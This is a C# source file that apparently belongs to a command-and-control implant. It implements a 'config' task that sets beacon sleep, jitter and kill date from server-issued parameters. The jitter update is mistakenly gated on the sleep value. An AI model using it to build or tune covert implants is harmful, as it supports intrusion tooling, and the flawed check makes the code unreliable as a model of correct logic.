using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "config";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            ConfigUpdateArgs args = new ConfigUpdateArgs();
            try
            {
                args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());   
            }

            if(args is null)
            {
                Console.WriteLine("null args");
                await messageManager.Write("Invalid parameters", job.task.id, true, "error");
                return;
            }


            try
            {
                StringBuilder sb = new StringBuilder();

                if(args.sleep >= 0)
                {
                    config.sleep = args.sleep;
                    Console.WriteLine("New Sleep: " + config.sleep);
                    sb.AppendLine($"Updated sleep interval to {config.sleep}");
                }

                if(args.sleep >= 0)
                {
                    config.jitter = args.jitter;
                    Console.WriteLine("New Jitter: " + config.jitter);
                    sb.AppendLine($"Updated jitter interval to {config.jitter}");
                }

                if(!String.IsNullOrEmpty(args.killdate))
                {
                    DateTime killDate;
                    if(DateTime.TryParse(args.killdate, out killDate))
                    {
                        if(killDate != DateTime.MinValue)
                        {
                            config.killDate = killDate;
                            sb.AppendLine($"Updated killdate to {config.killDate}");

                        }
                    }
                    else
                    {
                        sb.AppendLine($"Invalid date format {args.killdate}");

                    }
                }

                await messageManager.Write(sb.ToString(), job.task.id, true, "");

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());    
                await messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
